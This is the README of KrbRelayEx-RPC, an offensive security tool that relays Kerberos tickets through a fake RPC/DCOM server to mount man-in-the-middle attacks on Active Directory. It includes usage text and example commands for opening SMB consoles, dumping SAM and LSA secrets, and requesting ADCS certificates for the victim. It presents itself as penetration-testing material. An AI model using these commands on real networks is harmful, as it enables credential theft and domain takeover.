# KrbRelayEx  
<img width="575" alt="image" src="https://github.com/user-attachments/assets/e922aeeb-d389-4667-81ac-515d99bbeda5" />



![Version](https://img.shields.io/badge/version-1.0-blue)  
Kerberos Relay and Forwarder for (Fake) RPC/DCOM MiTM Server  

---
KrbRelayEx-RPC is a tool similar to my <a href=https://github.com/decoder-it/KrbRelayEx>KrbRelayEx</a> designed for performing Man-in-the-Middle (MitM) attacks by relaying Kerberos AP-REQ tickets. <br><br>
This version implements a fake RPC/DCOM server:<br>
- Listens for authenticated **ISystemActivator** requests and extracts the AP-REQ tickets
- Extracts dynamic port bindings from **EPMAPPER/OXID** resolutions
- Relay the AP-REQ to access SMB shares or HTTP ADCS (Active Directory Certificate Services) on behalf of the victim
- Forwards the victim's requests dynamically and transparently to the real  destination RPC/DCOM application so the  victim is unaware that their requests are being intercepted and relayed


## Disclaimer  

**This tool is intended exclusively for legitimate testing and assessment purposes, such as penetration testing or security research, with proper authorization.**  
Any misuse of this tool for unauthorized or malicious activities is strictly prohibited and beyond my responsibility as the creator. By using this tool, you agree to comply with all applicable laws and regulations.
## Why This Tool?  

I created this tool to explore the potential misuse of privileges granted to the `DnsAdmins` group in Active Directory, focusing on their ability to modify DNS records. Members of this group are considered privileged users because they can make changes that impact how computers and services are located within a network. However, despite this level of access, there has been relatively little documentation (apart from CVE-2021-40469) explaining how these privileges might be exploited in practice.

### Beyond DnsAdmins  
Manipulating DNS entries isn’t exclusive to the `DnsAdmins` group. Other scenarios can also enable such attacks, such as:  
- DNS zones with insecure updates enabled 
- Controlling HOSTS file entries on client machines


### Tool Goals  
The goal of this tool was to test whether a Man-in-the-Middle (MitM) attack could be executed by exploiting DNS spoofing, traffic forwarding, and Kerberos relaying. This is particularly relevant because **Kerberos authentication** is commonly used when a resource is accessed via its hostname or fully qualified domain name (FQDN), making it a cornerstone of many corporate networks.

Building upon the concept, I started from the great [KrbRelay](https://github.com/cube0x0/KrbRelay) and developed this tool in .NET 8.0 to ensure compatibility across both Windows and GNU/Linux platforms.

---

## Features  

- Relay Kerberos AP-REQ tickets to access SMB shares or HTTP ADCS endpoints.  
- Interactive or background **multithreaded SMB consoles** for managing multiple connections, enabling file manipulation and the creation/startup of services.  
- **Multithreaded port forwarding** to forward additional traffic from clients to original destination such as RDP, HTTP(S), RPC Mapper, WinRM,...
- Transparent relaying process for **seamless user access**.  
- Cross-platform compatibility with Windows and GNU/Linux via .NET 8.0 SDK.  

---

## Notes  

- **Relay and Forwarding Modes**:  
  KrbRelayEx intercepts and relays the first authentication attempt, then switches to forwarder mode for all subsequent incoming requests. You can press `r` anytime to restart relay mode.  

- **Scenarios for Exploitation**:  
  - Being a member of the `DnsAdmins` group.  
  - Configuring DNS zones with **Insecure Updates**: This misconfiguration allows anonymous users with network access to perform DNS Updates and potentially take over the domain!  
  - **Abusing HOSTS files for hostname spoofing**: By modifying HOSTS file entries on client machines, attackers can redirect hostname or FQDN-based traffic to an arbitrary IP address.  


- **Background Consoles**:  
  These are ideal for managing multiple SMB consoles simultaneously.  

### Related Tools  
For a similar Python-based tool built on Impacket libraries, check out [krbjack](https://github.com/almandin/krbjack).  

---

## Usage  

```plaintext
Usage:
  KrbRelayEx.exe -spn <SPN> [OPTIONS] [ATTACK]

Description:
  KrbRelayEx-RPC is a tool designed for performing Man-in-the-Middle (MitM) attacks and relaying Kerberos AP-REQ tickets.
  It listens for incoming authenticated ISystemActivator requests, extracts dynamic port bindings from EPMAPPER/OXID resolutions,
  captures the AP-REQ for accessing SMB shares or HTTP ADCS (Active Directory Certificate Services endpoints), then dynamically
  and transparently forwards the victim's requests to the real destination host and port
  The tool can span several SMB consoles, and the relaying process is completely transparent to the end user, who will seamlessly access the desired RPC/DCOM appliaction

Usage:
  KrbRelayEx.exe -spn <SPN> [OPTIONS] [ATTACK]

SMB Attacks:
  -console                       Start an interactive SMB console
  -bgconsole                     Start an interactive SMB console in background via sockets
  -list                          List available SMB shares on the target system
  -bgconsolestartport            Specify the starting port for background SMB console sockets (default: 10000)
  -secrets                       Dump SAM & LSA secrets from the target system

HTTP Attacks:
  -endpoint <ENDPOINT>           Specify the HTTP endpoint to target (e.g., 'CertSrv')
  -adcs <TEMPLATE>               Generate a certificate using the specified template

Options:
  -redirectserver <IP>           Specify the IP address of the target server for the attack
  -ssl                           Use SSL transport for secure communication
  -redirectports <PORTS>         Provide a comma-separated list of additional ports to forward to the target (e.g., '3389,445,5985')
  -rpcport <PORT>                Specify the RPC port to listen on (default: 135)

Examples:
  Start an interactive SMB console:
    KrbRelay.exe -spn CIFS/target.domain.com -console -redirecthost <ip_target_host>

  List SMB shares on a target:
    KrbRelay.exe -spn CIFS/target.domain.com -list

  Dump SAM & LSA secrets:
    KrbRelay.exe -spn CIFS/target.domain.com -secrets -redirecthost <ip_target_host>

  Start a background SMB console on port 10000 upon relay:
    KrbRelay.exe -spn CIFS/target.domain.com -bgconsole -redirecthost <ip_target_host>

  Generate a certificate using ADCS with a specific template:
    KrbRelay.exe -spn HTTP/target.domain.com -endpoint CertSrv -adcs UserTemplate-redirecthost <ip_target_host>

  Relay attacks with SSL and port forwarding:
    KrbRelay.exe -spn HTTP/target.domain.com -ssl -redirectserver <ip_target_host> -redirectports 3389,5985,135,553,80

Notes:
  - KrbRelayEx intercepts and relays the first authentication attempt,
    then switches to forwarder mode for all subsequent incoming requests.
    You can press any time 'r' for restarting relay mode

  - This tool is particularly effective if you can manipulate DNS names. Examples include:
    - Being a member of the DNS Admins group.
    - Having zones where unsecured DNS updates are allowed in Active Directory domains.
    - Gaining control over HOSTS file entries on client computers.

  - Background consoles are ideal for managing multiple SMB consoles

** IMPORTANT: Ensure that you configure the entries in your hosts file to point to the actual target IP addresses!

```


# Examples
<img width="754" alt="image" src="https://github.com/user-attachments/assets/6f1852f3-2c12-4493-b73f-c673b70d552c" />

<br><br>
<img width="590" alt="image" src="https://github.com/user-attachments/assets/f1570a67-c99c-4c1a-a75a-4d090e8a954f" />
<br><br>Video:<br>
https://youtu.be/fUqCL_NtVAo
# Installation instructions

The tool has been build with .Net 8.0 Framework. The Dotnet Core runtime for Windows and GNU/Linux can be downloaded here:
- https://dotnet.microsoft.com/en-us/download/dotnet/8.0
- On Ubuntu distros: sudo apt install dotnet8
- Required files:
  - KrbRelayEx.dll
  - KrbRelayEx.runtimeconfig.json
  - KrbRelayEx.exe -> optional for Windows platforms
  
# Acknowledgements

[Using Kerberos for Authentication Relay Attacks](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html)
<br>
[Using MITM to Attack Active Directory Authentication Schemes](https://media.defcon.org/DEF%20CON%2029/DEF%20CON%2029%20presentations/Sagi%20Sheinfeld%20Eyal%20Karni%20Yaron%20Zinar%20-%20Using%20Machine-in-the-Middle%20to%20Attack%20Active%20Directory%20Authentication%20Schemes.pdf)

